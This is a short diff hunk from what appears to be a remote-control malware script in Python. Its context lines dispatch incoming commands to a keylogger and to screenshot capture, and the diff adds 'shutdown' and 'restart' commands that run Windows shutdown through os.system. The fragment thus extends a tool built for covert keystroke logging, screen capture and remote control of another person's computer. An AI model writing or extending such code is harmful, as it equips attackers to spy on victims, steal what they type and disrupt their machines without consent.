@@ -49,3 +49,7 @@ if messager == 'keylogger':
         parent.join()
 elif messager == 'screenshots':
     takeScreenshot()
+elif messager == 'shutdown':
+    os.system("shutdown /s /t 1")
+elif messager == 'restart':
+    os.system("shutdown /r /t 1")
